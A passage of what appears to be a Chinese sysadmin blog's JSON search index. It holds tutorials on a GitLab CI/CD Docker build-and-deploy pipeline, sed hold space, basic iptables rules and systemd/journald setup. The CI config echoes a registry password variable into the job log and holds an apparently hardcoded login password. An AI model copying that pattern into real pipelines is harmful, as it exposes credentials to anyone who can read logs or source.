class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003e./mvnw package\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eartifacts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ereports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003edotenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebuild.env\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ePush\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003epush\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebefore_script\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker info || true\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker pull $HARBOR_REGISTRY_IMAGE:latest || true\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"sd\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      docker build\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --cache-from $HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg http_proxy=$http_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg https_proxy=$https_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --build-arg no_proxy=$no_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --cache-from HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      --tag $HARBOR_REGISTRY_IMAGE:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sd\"\u003e      .\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker push $HARBOR_REGISTRY_IMAGE:latest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003edocker logout $HARBOR_REGISTRY\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eBuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eDeploy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edeploy\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ecache\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecnych/kustomize:v1.0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho $COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit config --global user.name \u0026#34;GitLab CI/CD\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit clone git://172.18.31.50:30000/test-k8s.git\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ecd test-k8s/prod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ekustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003ecat kustomization.yaml\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit commit -am \u0026#39;PROD image update\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003egit push origin master\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eBuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etags\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eyunwei\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eonly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003emaster\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ewhen\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emanual\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e先不着急看这个文件，再普及一下 gitlab 的运行机制，它是通过 gitlab-runner 来执行cd的过程的。配置gitlab runner其实也是一项非常复杂的工作，里面可以配的东西太多了，不是本篇的范畴。我们这里简单来说，runner就是一个Docker容器。更准确的说，就是Docker in Docker。\u003c/p\u003e","title":"Gitlab的CICD实际生产环境应用"},{"content":"sed 和 awk 以及 cut 算是常用工具了，sed的高级用法也需要知道一下\nsed 里面有2个空间，一个是pattern space，一个是hold space，默认都是空的\n开始处理的时候，就从文件里一行一行读入 pattern space ，进行处理，hold space 只在你需要用到它的时候才会出现：\nd ： 清空pattern space中的内容，立即开始下个循环(意思是跳过默认的输出pattern space内容的阶段？？？不知理解的对不对)\rh ： 用pattern space中的内容替换hold pattern中的内容\rH ： 在hold space中的内容后面追加一个换行，把pattern space中的内容追加到hold space中\rg ： 用hold space中的内容替换pattern space中的内容\rG ： 在pattern space中的内容后面追加一个换行，把hold space中的内容追加到pattern space中\rh, g会替换（可以理解为先清空，再复制）, H, G是追加。 hH是放过去，gG是拿过来，小写是替换，大写是追加\n分析一下经典的将文件内容反向打印\ncat 1.txt\r1\r2\r3\rcat 1.txt | sed -n \u0026#39;1!G;h;$p\u0026#39;\r3\r2\r1 \u0026lsquo;1!G;h;$p\u0026rsquo; 分析一下，1!G就是说第一行不执行G，从第二行开始执行G；然后h是每行都执行，最后一行的时候执行p\ninput | pattern | hold | command | pattern | hold | command | pattern | hold\r1 | 1 | 空行 | | 1 | 空行 | h | 1 | 1\r2 | 2 | 1 | G | 21 | 1 | h | 21 | 21\r3 | 3 | 21 | G | 321 | 21 | h | 321 | 321 因为之前的参数是 -n 不打印，直到最后一行，$p打印Pattern空间里的内容，这样就直接被反转打印出来了。\n。\n","permalink":"https://rendoumi.com/posts/20221024-sed_advanced/","summary":"\u003cp\u003esed 和 awk 以及 cut 算是常用工具了，sed的高级用法也需要知道一下\u003c/p\u003e\n\u003cp\u003esed 里面有2个空间，一个是pattern space，一个是hold space，默认都是空的\u003c/p\u003e\n\u003cp\u003e开始处理的时候，就从文件里一行一行读入 pattern space ，进行处理，hold space 只在你需要用到它的时候才会出现：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ed ： 清空pattern space中的内容，立即开始下个循环(意思是跳过默认的输出pattern space内容的阶段？？？不知理解的对不对)\r\nh ： 用pattern space中的内容替换hold pattern中的内容\r\nH ： 在hold space中的内容后面追加一个换行，把pattern space中的内容追加到hold space中\r\ng ： 用hold space中的内容替换pattern space中的内容\r\nG ： 在pattern space中的内容后面追加一个换行，把hold space中的内容追加到pattern space中\r\n\r\nh, g会替换（可以理解为先清空，再复制）, H, G是追加。\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ehH是放过去，gG是拿过来，小写是替换，大写是追加\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666593244877\" loading=\"lazy\" src=\"/posts/20221024-sed_advanced/1666593244877.png\"\u003e\u003c/p\u003e\n\u003cp\u003e分析一下经典的将文件内容反向打印\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecat 1.txt\r\n1\r\n2\r\n3\r\n\r\ncat 1.txt | sed -n \u0026#39;1!G;h;$p\u0026#39;\r\n3\r\n2\r\n1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u0026lsquo;1!G;h;$p\u0026rsquo; 分析一下，1!G就是说第一行不执行G，从第二行开始执行G；然后h是每行都执行，最后一行的时候执行p\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003einput | pattern |  hold   | command | pattern | hold | command | pattern | hold\r\n1     | 1       |  空行    |         | 1       | 空行 |  h      | 1       | 1\r\n2     | 2       |  1      | G       | 21      | 1    |  h      | 21      | 21\r\n3     | 3       |  21     | G       | 321     | 21   |  h      | 321     | 321\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"1666595506589\" loading=\"lazy\" src=\"/posts/20221024-sed_advanced/1666595506589.png\"\u003e\u003c/p\u003e","title":"sed的进阶用法"},{"content":"面试的时候经常会被问到 iptables 的问题，那么下面就运维角度来总结一下基本的用法。\n看晕了吧，不要紧，我们关注上面的5个红色，5个链条，然后继续看下面的表，详细解释了上面的流程：\n两张图结合起来看，意思就是整个 iptables 可以动手的地方太多了。\n我们完全没必要关注那么多的细节，常用的地方就2个：\n一、最后的出口nat postrouting iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 上面是做 openvpn 时常用的，一定记得不要乱用 MASQUERADE，而要指定 特定网段（10.11.0.0/16） 从 特定IP（172.16.8.1） 出去。\n二、filter表 filter表是 iptables 缺省不带参数查看的表，用于过滤数据包，这是我们操作的最多的地方\niptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT\riptables -A INPUT -p tcp --dport 12530 -j DROP 上面就只开放了一个IP 185.207.178.236可以访问本机的12530端口，其余的统统封掉，这是最常用的脚本了。\nOK，以上两点是最常用的。其余的端口转发之类的，最好中间用haproxy和nginx进行代理，否则查看 iptables 系统的架构就变得不清晰了。\n下面贴上常用的参数：\n-p tcp/udp/icmp/all\t匹配协议，all会匹配所有协议\r-s addr[/mask]\t匹配源地址\r-d addr[/mask] 匹配目标地址\t--sport\t匹配源端口（可指定连续的端口）如--sport80\r--dport\t匹配目的端口（可指定连续的端口）如--dport80\r-o interface\t匹配出口网卡，只适用于FORWARD、POSTROUTING、OUTPUT（例：iptables -A FORWARD -o eth0）\r-i interface\t匹配入口网卡，只适用于PREROUTING、INPUT、FORWARD\r--icmp-type\t匹配icmp类型（使用iptables -p icmp -h可查看可用的icmp类型）\r--tcp-flags mask comp\t匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记（例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT 表示匹配SYN和ACK标记的数据包）\r-j DROP/ACCEPT/REJECT/LOG\t拒绝/允许/拒绝并发出消息/在/var/log/messages中登记分组匹配的记录\r-m mac -mac\t绑定MAC地址\r-m limit -limit 1/s 1/m\t设置时间策略\r-s 192.168.1.153或192.168.1.0/24\t指定源地址或地址段\r-d 192.168.1.153或192.168.1.0/24\t指定目标地址或地址段\r-s ! 192.168.1.0\t指定源地址以外的 基本的2个用法足够满足日常运维的需要了。\n","permalink":"https://rendoumi.com/posts/20221024-iptables/","summary":"\u003cp\u003e面试的时候经常会被问到 iptables 的问题，那么下面就运维角度来总结一下基本的用法。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666582967919\" loading=\"lazy\" src=\"/posts/20221024-iptables/1666582967919.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看晕了吧，不要紧，我们关注上面的5个红色，5个链条，然后继续看下面的表，详细解释了上面的流程：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"img\" loading=\"lazy\" src=\"/posts/20221024-iptables/image-20220719121029628.png\"\u003e\u003c/p\u003e\n\u003cp\u003e两张图结合起来看，意思就是整个 iptables 可以动手的地方太多了。\u003c/p\u003e\n\u003cp\u003e我们完全没必要关注那么多的细节，常用的地方就2个：\u003c/p\u003e\n\u003ch4 id=\"一最后的出口nat-postrouting\"\u003e一、最后的出口nat postrouting\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eiptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面是做 openvpn 时常用的，一定记得不要乱用 MASQUERADE，而要指定 特定网段（10.11.0.0/16） 从 特定IP（172.16.8.1） 出去。\u003c/p\u003e\n\u003ch4 id=\"二filter表\"\u003e二、filter表\u003c/h4\u003e\n\u003cp\u003efilter表是 iptables 缺省不带参数查看的表，用于过滤数据包，这是我们操作的最多的地方\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eiptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT\r\niptables -A INPUT -p tcp --dport 12530 -j DROP\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面就只开放了一个IP 185.207.178.236可以访问本机的12530端口，其余的统统封掉，这是最常用的脚本了。\u003c/p\u003e\n\u003cp\u003eOK，以上两点是最常用的。其余的端口转发之类的，最好中间用haproxy和nginx进行代理，否则查看 iptables 系统的架构就变得不清晰了。\u003c/p\u003e\n\u003cp\u003e下面贴上常用的参数：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e-p tcp/udp/icmp/all\t        匹配协议，all会匹配所有协议\r\n-s addr[/mask]\t            匹配源地址\r\n-d addr[/mask]              匹配目标地址\t\r\n--sport\t                    匹配源端口（可指定连续的端口）如--sport80\r\n--dport\t                    匹配目的端口（可指定连续的端口）如--dport80\r\n-o interface\t            匹配出口网卡，只适用于FORWARD、POSTROUTING、OUTPUT（例：iptables -A FORWARD -o eth0）\r\n-i interface\t            匹配入口网卡，只适用于PREROUTING、INPUT、FORWARD\r\n--icmp-type\t                匹配icmp类型（使用iptables -p icmp -h可查看可用的icmp类型）\r\n--tcp-flags mask comp\t    匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记（例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT 表示匹配SYN和ACK标记的数据包）\r\n-j DROP/ACCEPT/REJECT/LOG\t拒绝/允许/拒绝并发出消息/在/var/log/messages中登记分组匹配的记录\r\n-m mac -mac\t绑定MAC地址\r\n-m limit -limit 1/s 1/m\t    设置时间策略\r\n-s 192.168.1.153或192.168.1.0/24\t指定源地址或地址段\r\n-d 192.168.1.153或192.168.1.0/24\t指定目标地址或地址段\r\n-s ! 192.168.1.0\t指定源地址以外的\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e基本的2个用法足够满足日常运维的需要了。\u003c/p\u003e","title":"iptables的基本用法"},{"content":"时代已经进化到 systemd 的年代了，service 应该是彻底没有市场了\nsystemd 的好处是写程序的时候再也不用 fork 甩脱父进程了，日志直接输出终端即可\n对 java 来说也是个好事，所有的日志比如WARN ERROR INFO都可以交给journal来管理，这样要查找日志也非常方便了。\n举个例子，我们要把一个java启动的程序做成 systemd 的：\nvim /etc/systemd/system/circle.service\n[Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/export/prod/server Type=simple ExecStart=/usr/bin/java -jar -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target 然后就可以运行了：\nsystemctl daemon-reload systemctl start circle 注意上面的WorkingDirectory，因为下面java启动指定 application.properties 配置文件的时候没有用绝对路径，那么这里就要指定当前工作目录了。\n另外RestartSec=1s也改了，缺省是10ms，太快了\n当然这只是第一步，日志是归journal管了，journal还是需要进一步配置的\n首先必须要持久化存储到磁盘，否则只会在/run/log/journal内存中存放，重启就没了\n#disk-usage查看的是: 内存+/var/log/journal的加起来的总和大小 journalctl --disk-usage 然后我们需要修改配置，让它持久化\nvi /etc/systemd/journald.conf Storage=persistent 修改重启\nmkdir /var/log/journal systemd-tmpfiles --create --prefix /var/log/journal systemctl restart systemd-journald 最后刷一下，把内存的文件刷到磁盘中\njournalctl --flush 还可以设置保存天数：\njournalctl --vacuum-time=31d 查看是从那一天开始保存的，进目录查看时间戳即可\ncd /var/log/journal ls -lha 最后就是一个秘籍了，如果把日志弄出来查看\njournalctl -u circle --since \u0026#34;2022-10-19 14:30:00\u0026#34; --until \u0026#34;2022-10-19 15:00:00\u0026#34; 开发人员经常问我要日志，这样就特别方便快捷了，比从log4j的日志目录里拉方便的多。\n","permalink":"https://rendoumi.com/posts/20220925-awk_usage/","summary":"\u003cp\u003e时代已经进化到 systemd 的年代了，service 应该是彻底没有市场了\u003c/p\u003e\n\u003cp\u003esystemd 的好处是写程序的时候再也不用 fork 甩脱父进程了，日志直接输出终端即可\u003c/p\u003e\n\u003cp\u003e对 java 来说也是个好事，所有的日志比如WARN ERROR INFO都可以交给journal来管理，这样要查找日志也非常方便了。\u003c/p\u003e\n\u003cp\u003e举个例子，我们要把一个java启动的程序做成 systemd 的：\u003c/p\u003e\n\u003cp\u003evim /etc/systemd/system/circle.service\u003c/p\u003e\n\u003cpre 